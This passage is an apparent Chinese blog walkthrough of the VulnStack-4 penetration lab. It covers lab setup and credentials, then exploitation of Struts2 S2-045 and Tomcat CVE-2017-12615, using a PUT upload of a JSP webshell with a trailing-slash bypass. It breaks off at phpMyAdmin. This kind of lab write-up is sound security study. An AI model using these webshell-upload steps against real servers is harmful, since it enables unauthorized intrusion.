@@ -1,0 +1,1349 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="安全, 渗透测试, Web安全">
+    
+    
+    <meta name="author" content="W1nner丶">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://tamoon1.github.io/2026/02/13/internal-network-4/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网提权教程——VulnStack-4靶场内网横向解析(Struts2，Tomcat，phpmyadmin漏洞利用，Dockers容器逃逸，Socks代理内网，PTH横向)">
+<meta property="og:url" content="https://tamoon1.github.io/2026/02/13/Internal-network-4/index.html">
+<meta property="og:site_name" content="W1nner&#39;s Blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tamoon1.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-02-13T10:27:15.000Z">
+<meta property="article:modified_time" content="2026-06-04T04:31:24.513Z">
+<meta property="article:author" content="W1nner丶">
+<meta property="article:tag" content="Internal network penetration">
+<meta property="article:tag" content="内网横向提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tamoon1.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="../../../../images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="../../../../images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            内网提权教程——VulnStack-4靶场内网横向解析(Struts2，Tomcat，phpmyadmin漏洞利用，Dockers容器逃逸，Socks代理内网，PTH横向) | W1nner丶的博客
+        
+    </title>
+
+    
+<link rel="stylesheet" href="fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"tamoon1.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"W1nner丶's Studio","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                W1nner丶的博客
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="../../../../index.html"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="../../../../index.html"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">内网提权教程——VulnStack-4靶场内网横向解析(Struts2，Tomcat，phpmyadmin漏洞利用，Dockers容器逃逸，Socks代理内网，PTH横向)</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="../../../../images/touxiang.jpeg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">W1nner丶</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-02-13 18:27:15</span>
+        <span class="mobile">2026-02-13 18:27:15</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-06-04 12:31:24</span>
+            <span class="mobile">2026-06-04 12:31:24</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="../../../../categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/">技术分享</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="../../../../tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%8F%90%E6%9D%83/">内网横向提权</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="../../../../tags/Internal-network-penetration/">Internal network penetration</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>本次实践围绕内网渗透与漏洞利用展开，综合运用了多种攻防技术与工具。从Web应用层面的Struts2、Tomcat及phpMyAdmin漏洞测试，到容器环境下的Docker逃逸，再到利用Metasploit框架进行内网代理配置、密码哈希提取与端口扫描，最终通过PTH攻击实现域内横向渗透并将目标会话迁移至Cobalt Strike。整个过程覆盖了从边界突破到内网纵深的完整渗透链路，展现了从获取初始权限到掌控域内资源的全流程攻防思路。</p>
+</blockquote>
+<hr>
+<h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><p>本次靶场渗透反序列化漏洞、命令执行漏洞、Tomcat漏洞、MS系列漏洞、端口转发漏洞、以及域渗透等多种组合漏洞，希望能对大家有所启发；</p>
+<blockquote>
+<p>靶场机器密码：</p>
+<ul>
+<li>ubuntu &#x2F; <code>ubuntu</code></li>
+<li>douser &#x2F; <code>Dotest123</code></li>
+<li>administrator &#x2F; <code>Test2008</code></li>
+</ul>
+</blockquote>
+<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>首先我们需要分别配置三台主机的网络，NAT网段<code>192.168.44.0/24</code> 和内网网段<code>10.10.10.0/24</code> ：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="b38f342e04b64e35bdf1c46a8d6072e2.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>（1）Web主机—双网卡：NAT和内网网段<br>（2）内网Win7主机：内网网段<br>（3）域控DC：内网网段</p>
+<ul>
+<li>Web主机地址: <code>192.168.44.128</code> 和 <code>10.10.10.24</code></li>
+<li>内网Win7: <code>10.10.10.25</code></li>
+<li>域控DC: <code>10.10.10.26</code></li>
+</ul>
+<p>同时需要在ubuntu的web机器上，<strong>手动开启服务：</strong></p>
+<p>首先需要Ctrl+Alt+T 打开一个命令终端，随后切换到相应目录：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="f87f0b4d32ab473eb84f76b5fceb1787.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>随后进入到相应服务开启即可：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line"><span class="built_in">sudo</span> docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</span><br><span class="line"><span class="built_in">sudo</span> docker-compose up -d</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</span><br><span class="line"><span class="built_in">sudo</span> docker-compose up -d</span><br></pre></td></tr></table></figure></div>
+<p>成功启动服务：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="37c52905da6345628835e6c6f7a83434.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<h3 id="内网的拓扑图结构"><a href="#内网的拓扑图结构" class="headerlink" title="内网的拓扑图结构"></a>内网的拓扑图结构</h3><p>内网的拓扑图结构如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="84740b589a3e45919d7579f4de4036d8.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>至此，可以开始我们的渗透了；</p>
+<hr>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先我们需要知道目标主机具体开放哪些<strong>服务以及端口</strong>，具体结果如下：</p>
+<p>可以使用多种工具<code>goby</code>，<code>xray</code>，<code>namp</code>，<code>御剑</code>等；</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="094d8cccb2d54c38bfbe8d857c25eb11.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="65ebe15999a44ecdb6929a1ed4884fe7.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以看到，目标机器开启了四个服务：</p>
+<ul>
+<li>22&#x2F;tcp - <code>ssh</code> - OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13</li>
+<li>2001&#x2F;tcp - <code>Jetty</code> 9.2.11.v20150529</li>
+<li>2002&#x2F;tcp  - <code>Apache Tomcat 8.5.19</code></li>
+<li>2003&#x2F;tcp  - Apache httpd 2.4.25 (Debian) - <code>phpMyAdmin 4.8.1</code></li>
+</ul>
+<p>上述开放的<strong>Tomcat 8.x</strong>和<strong>phpmyadmin 4.8.x</strong> 都是低版本可以利用的<code>RCE漏洞</code>，而2001端口，通过访问，也是发现其服务为<strong>struts2</strong>服务：</p>
+<hr>
+<h2 id="Struts2漏洞利用"><a href="#Struts2漏洞利用" class="headerlink" title="Struts2漏洞利用"></a>Struts2漏洞利用</h2><p>通过访问 <a class="link"   target="_blank" rel="noopener" href="http://192.168.44.128:2001/" >http://192.168.44.128:2001/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="e586fb0ad47944d6a8bd81671bc958cf.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>可以看到，该页面是一个上传文件页面。</p>
+<blockquote>
+<p><strong>Struts 2框架</strong>是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts 2作为控制器来建立模型与视图的数据交互。常见的漏洞主要有：</p>
+<ul>
+<li>S2-045（CVE-2017-5638）基于 Jakarta Multipart 解析器的远程代码执行漏洞，影响 Struts 2.3.5–2.3.31、2.5–2.5.10 版本，攻击者可通过构造恶意Content-Type头执行任意代码。</li>
+<li>S2-048（CVE-2017-9791）<br>Struts2 REST 插件的远程代码执行漏洞，影响 2.5.0–2.5.12 版本，攻击者可构造恶意请求触发代码执行。</li>
+<li>S2-052（CVE-2017-9805）<br>Struts2 REST 插件 XStream 反序列化漏洞，影响 2.5.0–2.5.12 版本，可导致远程代码执行。</li>
+<li>S2-061（CVE-2020-17530）<br>OGNL 注入漏洞，影响 Struts 2.3.35 之前、2.5.22 之前版本，攻击者可构造恶意请求执行任意代码。</li>
+</ul>
+</blockquote>
+<h3 id="web目录枚举（失败）"><a href="#web目录枚举（失败）" class="headerlink" title="web目录枚举（失败）"></a>web目录枚举（失败）</h3><p>仅仅只有一个文件上传页面不够的，所以我们可以对其进行<strong>Web目录扫描</strong>：</p>
+<p>可以看到结果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="d6cb9e04ff064126ae90d05099fc7e09.png"
+                      alt="在这里插入图片描述"
+                ><br>或者使用<code>dirsearch</code>：</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保留常见状态码</span></span><br><span class="line">python dirsearch.py -u http://192.168.44.128:2001/ -i 200,301,302,401,500</span><br></pre></td></tr></table></figure></div>
+<p>但是并没有什么可利用的信息：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="d77dc80739f14be9b1f107d1917c003a.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>既然如此，那就换个方法；</p>
+<h3 id="冰蝎连接上线Webshell"><a href="#冰蝎连接上线Webshell" class="headerlink" title="冰蝎连接上线Webshell"></a>冰蝎连接上线Webshell</h3><p>这里我们通过工具检测发现了可能存在的漏洞：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="daa7251a1d84476f8a0c8c2b2ce87154.png"
+                      alt="在这里插入图片描述"
+                ><br>尝试执行命令：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="386c82c1747a4d0a94de524baafd428d.png"
+                      alt="在这里插入图片描述"
+                ><br>可以看到直接获取了服务器的<code>最高权限root</code>；</p>
+<p>随后我生成了一个<code>冰蝎</code>的木马，随后上传<strong>Webshell</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="22076378d12f4fe1a271b3c2b7730139.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>将其添加到冰蝎，<code>成功上线目标机器：</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="100ff34661574500958846136c81c3a8.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="3860bfc67d0c45539beef21bf004c486.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<blockquote>
+<p>这里我还尝试过<strong>哥斯拉</strong>以及php，asp等格式文件，均失败；</p>
+<ul>
+<li>只有<code>冰蝎的jsp文件</code>才能上传成功；</li>
+<li>如果有其他成功的方法，可私信我，欢迎大家讨论分享；</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="Tomcat-8-5-19-漏洞利用"><a href="#Tomcat-8-5-19-漏洞利用" class="headerlink" title="Tomcat 8.5.19 漏洞利用"></a>Tomcat 8.5.19 漏洞利用</h2><p>访问网址<a class="link"   target="_blank" rel="noopener" href="http://192.168.44.128:2002/%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%A6%82%E4%B8%8B%EF%BC%9A" >http://192.168.44.128:2002/，页面如下：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="4bd900a7c2034ba0906b5512440e1cf8.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>而该版本的Tomcat也是存在很多<strong>高危漏洞</strong>的：</p>
+<ul>
+<li>CVE-2017-12615（任意文件上传 &#x2F; 远程代码执行）<ul>
+<li>风险：当启用 HTTP PUT 方法（如将readonly参数设为false）时，攻击者可上传恶意 JSP 文件并执行任意代码，获取服务器权限。</li>
+</ul>
+</li>
+<li>CVE-2020-1938（Ghostcat，AJP 协议文件读取 &#x2F; 包含）<ul>
+<li>风险：AJP Connector 默认开启，攻击者可通过构造恶意请求读取任意文件（如&#x2F;WEB-INF&#x2F;web.xml）或包含恶意文件，导致信息泄露或代码执行。</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>核心修复建议： </p>
+<ul>
+<li>优先升级版本：直接升级到 Tomcat 8.5.x 的最新稳定版（如 <strong>8.5.99</strong>+），可覆盖绝大多数已知漏洞。</li>
+</ul>
+</blockquote>
+<h3 id="Web目录枚举（失败）"><a href="#Web目录枚举（失败）" class="headerlink" title="Web目录枚举（失败）"></a>Web目录枚举（失败）</h3><p>还是老样子，对其进行扫描：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="8fd8816ce2f345529e51cd261065e837.png"
+                      alt="在这里插入图片描述"
+                ><br>同样未发现敏感目录。</p>
+<h3 id="Tomcat任意文件上传"><a href="#Tomcat任意文件上传" class="headerlink" title="Tomcat任意文件上传"></a>Tomcat任意文件上传</h3><p>这里我们随便抓一个<a class="link"   target="_blank" rel="noopener" href="http://192.168.44.128:2002/" >http://192.168.44.128:2002/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 的包，然后对请求包进行修改：</p>
+<ul>
+<li>数据包的请求方式修改为<code>PUT</code></li>
+<li>请求的URI修改为<code>/shell2.jsp/</code></li>
+<li>请求头部新增请求头<code>Content-Type:application/x-www-form-urlencoded</code></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="4366fcba776e4b598780cd65356d2767.png"
+                      alt="在这里插入图片描述"
+                ><br>（失败？这里用了我二十分钟，终于找到了原因：）</p>
+<blockquote>
+<p>这里发现后缀为<code>jsp的格式</code>好像是上传不成功，那么我们可以尝试绕过，这里绕过的方式有很多，可以文件流绕过，可以空格绕过，可以”&#x2F;“绕过，大家可以自己尝试，这里我用”&#x2F;“绕过</p>
+<ul>
+<li>也就是jsp后缀加上’ <code>\</code> ‘ 即可；</li>
+</ul>
+</blockquote>
+<p>成功：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="ec156769dc5243eea4df4853323b092c.png"
+                      alt="在这里插入图片描述"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="7dadbcdbb597444ebe3221f9ff6e5a2e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<p>成功<code>上线第二个Webshell：</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="35b0ffee798e4dc580e97837f35dab4e.png"
+                      alt="在这里插入图片描述"
+                ></p>
+<hr>
+<h2 id="phpmyadmin漏洞利用"><a href="#phpmyadmin漏洞利用" class="headerlink" title="phpmyadmin漏洞利用"></a>phpmyadmin漏洞利用</h2><p>访问<a class="link"   target="_blank" rel="noopener" href="http://192.168.44.128:2003/" >http://192.168.44.128:2003/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ，不需要任何账号密码，<strong>直接得到</strong>数据库的页面：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="7d5d0419c2b2427f87c93309c00fd4aa.png"
